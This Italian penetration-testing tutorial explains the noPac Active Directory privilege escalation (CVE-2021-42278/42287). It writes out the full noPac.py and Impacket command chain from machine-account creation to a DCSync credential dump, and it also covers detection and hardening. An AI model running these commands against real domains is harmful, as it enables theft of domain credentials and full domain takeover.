---
title: 'noPac Active Directory: exploit da utente standard a Domain Admin'
slug: nopac
description: >-
  noPac su Active Directory: sfrutta CVE-2021-42278 e CVE-2021-42287 per
  impersonare un Domain Controller, fare DCSync e ottenere Domain Admin
image: /file_00000000b52072438e3782606fa644e1.webp
draft: false
date: 2026-03-03T00:00:00.000Z
categories:
  - cve
subcategories:
  - high
tags:
  - 'CVE Windows '
featured: true
---

noPac è una delle catene di privilege escalation più pericolose mai viste in [Active Directory](https://hackita.it/articoli/active-directory). Combina **CVE-2021-42278** e **CVE-2021-42287** per far sì che il KDC tratti un machine account controllato dall'attaccante come se fosse il Domain Controller reale.

Il risultato operativo è diretto: **impersonation del DC → [DCSync](https://hackita.it/articoli/dcsync) → compromissione del dominio**.

In un contesto offensivo reale, noPac è uno dei controlli più redditizi da provare appena ottieni credenziali valide. Se il dominio è vulnerabile, la catena **[password spraying](https://hackita.it/articoli/password-spraying) → noPac → DCSync** può trasformare un accesso basso in privilegio massimo in pochissimo tempo.

***

## ⚡ Perché noPac È Così Critico

| Caratteristica                   | Impatto                                              |
| -------------------------------- | ---------------------------------------------------- |
| **Auth richiesta**               | Solo un utente di dominio autenticato                |
| **Vettore d'attacco**            | Errore logico nel flusso Kerberos/KDC                |
| **Obiettivo finale**             | [DCSync](https://hackita.it/articoli/dcsync) diretto |
| **Rapporto impatto/complessità** | Altissimo                                            |

A differenza di altre escalation più lunghe, qui non ti serve una catena complessa di ACL, delegation abuse o movimento laterale preliminare: se i prerequisiti sono presenti, l'exploit è rapido e molto efficace.

***

## 📊 noPac 80/20

| Elemento           | Dettaglio                                                                                                                                                                       |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CVE**            | [CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) + [CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) |
| **Auth richiesta** | Qualsiasi utente di dominio                                                                                                                                                     |
| **Prerequisito**   | `MachineAccountQuota > 0` oppure un machine account già controllato                                                                                                             |
| **Impatto**        | Impersonation del DC → [DCSync](https://hackita.it/articoli/dcsync)                                                                                                             |
| **Difficoltà**     | Bassa con exploit automatico                                                                                                                                                    |
| **Patch**          | Novembre 2021                                                                                                                                                                   |

***

## 🗺️ Attack Path noPac

```

Utente di dominio → Crea machine account → Rinomina il machine account → Confusione nel KDC → Impersona il DC → DCSync → Domain Admin

```

Questa è la forza di noPac: una catena corta, chiara e con impatto immediato.

***

## 🧠 Cos'è noPac

noPac nasce dalla combinazione di due vulnerabilità:

* **[CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)**: permette di rinominare un machine account in modo pericoloso, rimuovendo il `$`
* **[CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)**: il KDC gestisce male la risoluzione del principal e può fare fallback sull'account del Domain Controller reale

In pratica, l'attaccante crea o controlla un computer account, lo rinomina strategicamente e sfrutta il comportamento di Kerberos per ottenere ticket che aprono la strada all'impersonation del DC.

***

## ✅ Quando Funziona

noPac funziona quando:

* I Domain Controller **non sono patchati** (patch di novembre 2021 assente)
* `MachineAccountQuota` è maggiore di 0
* L'attaccante ha **credenziali valide** di un utente di dominio
* Il dominio consente ancora la creazione di computer account da parte di utenti normali

> 💡 **Nota bene**: Se il dominio è aggiornato e hardenizzato correttamente, la catena si interrompe.

***

## 🔍 Come Verificare Se Il Dominio È Attaccabile

Il primo controllo utile è verificare il valore di `MachineAccountQuota`.

```bash
netexec ldap DC_IP -u user -p Password123 -M maq
```

Se il valore è maggiore di zero, un utente di dominio standard può normalmente creare un nuovo computer account. Questo rende la catena molto più semplice da eseguire.

Segnali utili:

· ✅ Credenziali di dominio valide già ottenute
· ✅ Ambiente legacy o poco aggiornato
· ✅ Possibilità di aggiungere oggetti computer
· ✅ Nessun hardening evidente lato Kerberos

***

⚙️ Exploit Rapido Con noPac.py

Per una validazione veloce, il metodo più pratico è usare noPac.py.

🔎 Scan

```bash
python3 noPac.py corp.local/user:Password123 -dc-ip DC_IP -dc-host DC_HOSTNAME --scan
```

La modalità --scan ti permette di capire se il target è promettente senza andare subito sulla parte più invasiva.

💥 Exploit

```bash
python3 noPac.py corp.local/user:Password123 -dc-ip DC_IP -dc-host DC_HOSTNAME --impersonate administrator -dump
```

Con --impersonate administrator -dump, la catena viene automatizzata: impersonation e tentativo di dump tramite DCSync.

***

## 🛠️ Exploit Manuale Con Impacket

L'exploit automatico è il più veloce. L'approccio manuale con **[Impacket](https://github.com/fortra/impacket)** è quello migliore per capire davvero la tecnica e fare troubleshooting.

### 📦 Passaggi Dettagliati

| Fase                                | Comando                                                                                                                                           | Tool                                                                                      |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| **1. Crea un machine account**      | `impacket-addcomputer corp.local/user:Password123 -computer-name 'NOPAC$' -computer-pass 'FakePass' -dc-ip DC_IP`                                 | [addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)     |
| **2. Rinominalo senza `$`**         | `impacket-renameMachine corp.local/user:Password123 -current-name 'NOPAC$' -new-name 'DC_NAME' -dc-ip DC_IP`                                      | [renameMachine](https://github.com/fortra/impacket/blob/master/examples/renameMachine.py) |
| **3. Richiedi un TGT**              | `impacket-getTGT corp.local/'DC_NAME':'FakePass' -dc-ip DC_IP`                                                                                    | [getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)               |
| **4. Ripristina il nome originale** | `impacket-renameMachine corp.local/user:Password123 -current-name 'DC_NAME' -new-name 'NOPAC$' -dc-ip DC_IP`                                      | [renameMachine](https://github.com/fortra/impacket/blob/master/examples/renameMachine.py) |
| **5. Richiedi service ticket**      | `impacket-getST corp.local/'DC_NAME$' -spn cifs/DC.corp.local -impersonate administrator -dc-ip DC_IP -k -no-pass`                                | [getST](https://github.com/fortra/impacket/blob/master/examples/getST.py)                 |
| **6. Esegui DCSync**                | `export KRB5CCNAME=administrator@cifs_DC.corp.local@CORP.LOCAL.ccache && impacket-secretsdump corp.local/administrator@DC.corp.local -k -no-pass` | [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)     |

Se la catena va a buon fine, hai un impatto critico sul dominio partendo da un utente standard.

***

## 🧰 Tool Correlati (Impacket)

Oltre ai tool usati nell'exploit, ecco altri strumenti di **[Impacket](https://github.com/fortra/impacket)** che potrebbero esserti utili in fase di enumerazione e post-exploit:

| Tool                                                               | Descrizione                                                                 |
| ------------------------------------------------------------------ | --------------------------------------------------------------------------- |
| **[GetADUsers](https://hackita.it/articoli/getadusers)**           | Enumera utenti dal dominio                                                  |
| **[GetADComputers](https://hackita.it/articoli/getadcomputers)**   | Recupera informazioni sui computer                                          |
| **[GetNPUsers](https://hackita.it/articoli/getnpusers)**           | Cerca utenti con Kerberos pre-autenticazione disabilitata (AS-REP Roasting) |
| **[GetLAPSPassword](https://hackita.it/articoli/getlapspassword)** | Estrae password LAPS da LDAP                                                |
| **[samrdump](https://hackita.it/articoli/samrdump)**               | Dump degli account SAM                                                      |
| **[rpcdump](https://hackita.it/articoli/rpcdump)**                 | Enumera endpoint RPC                                                        |
| **[ntlmrelayx](https://hackita.it/articoli/ntlmrelayx)**           | Strumento avanzato per NTLM relay                                           |

***

## ⚠️ Errori Comuni

* ❌ Non verificare `MachineAccountQuota` prima di partire
* ❌ Lanciare subito l'exploit senza `--scan`
* ❌ Non ripristinare il machine account nel flow manuale
* ❌ Pensare che basti sempre "qualsiasi utente" anche su domini patchati
* ❌ Usare solo la versione automatica senza capire il meccanismo

***

## 🌍 Contesto Reale

Nel 2026, noPac è raro negli ambienti enterprise ben gestiti, ma resta ancora presente in:

* 🏚️ Infrastrutture legacy
* 🧪 Lab AD vulnerabili
* 📉 Domini trascurati o aggiornati male

Come ZeroLogon e PrintNightmare, non è il bug che trovi ovunque — ma quando lo trovi, il valore offensivo è altissimo.

###### La catena più comune resta:&#xA;Password-spray → noPac → DCSync

***

## ✅ Checklist Operativa

☐ Credenziali di dominio valide ottenute\
☐ `MachineAccountQuota` verificato\
☐ Scan eseguito con `--scan`\
☐ Exploit eseguito\
☐ DCSync tentato o completato\
☐ Cleanup del machine account effettuato\
☐ Evidenze salvate per il report

***

## 🛡️ Detection / Difesa

| Azione            | Descrizione                                        |
| ----------------- | -------------------------------------------------- |
| **Patch**         | Applica le patch di novembre 2021                  |
| **MAQ**           | Imposta `MachineAccountQuota = 0`                  |
| **Event ID 4741** | Monitora creazione di computer account             |
| **Event ID 4742** | Monitora modifiche sospette ai machine account     |
| **Kerberos**      | Controlla richieste anomale su principal macchina  |
| **ACL**           | Limita chi può creare oggetti computer nel dominio |

La combinazione davvero efficace è: **patching + MAQ a zero + logging serio**.

***

## ❓ FAQ

**Cos'è noPac?**\
È una catena di privilege escalation che combina CVE-2021-42278 e CVE-2021-42287 per permettere a un utente di dominio di impersonare un Domain Controller e arrivare fino a [DCSync](https://hackita.it/articoli/dcsync).

**noPac funziona ancora nel 2026?**\
Sì, ma solo su Domain Controller non correttamente patchati. In ambienti maturi è raro; in ambienti legacy è ancora molto pericoloso.

**Serve `MachineAccountQuota`?**\
Sì, se devi creare un nuovo machine account. Se `MachineAccountQuota = 0`, puoi comunque sfruttare la tecnica solo se controlli già un computer account.

**Qual è la differenza tra noPac e ZeroLogon?**\
ZeroLogon segue una logica diversa e non richiede lo stesso tipo di abuso identità/Kerberos. noPac invece parte da credenziali valide e sfrutta il comportamento del KDC.

**noPac è un attacco Kerberos?**\
Sì. Anche se parte dagli account macchina, il cuore della catena è il comportamento del KDC e il rilascio dei ticket Kerberos.

***

## 🔗 Riferimenti Esterni

* [Microsoft Security Response Center — CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278)
* [Microsoft Security Response Center — CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287)
* [Fortra Impacket — Repository Ufficiale](https://github.com/fortra/impacket)
* [noPac su GitHub (scopedsecurity)](https://github.com/scopedsecurity/noPac)

***

## 🎯 Key Takeaway

**noPac è una delle escalation più rapide e redditizie in Active Directory non patchato: da utente standard a compromissione del dominio con una catena breve, automatizzabile e ad altissimo impatto.**

***

## ❤️ Supporta HackIta

Se questo articolo ti è stato utile e vuoi contribuire alla crescita del progetto, puoi sostenere HackIta con una donazione. Anche un piccolo gesto aiuta a mantenere vivo il progetto e a produrre contenuti di qualità sulla sicurezza informatica.

👉 **[hackita.it/supporto](https://hackita.it/supporto)**

***

## 🛡️ Servizi HackIta

Hai bisogno di qualcosa di più concreto? Offriamo anche:

* 🎓 **Formazione 1:1** — Percorsi personalizzati per ethical hacking, penetration testing e Active Directory
* 🔥 **Test di vulnerabilità per aziende/siti web** — Scopri se la tua infrastruttura regge prima che lo faccia qualcun altro

👉 **[hackita.it/servizi](https://hackita.it/servizi)**

Grazie per il supporto!

***

*Articolo aggiornato al 2026 - HackIta Security Research*
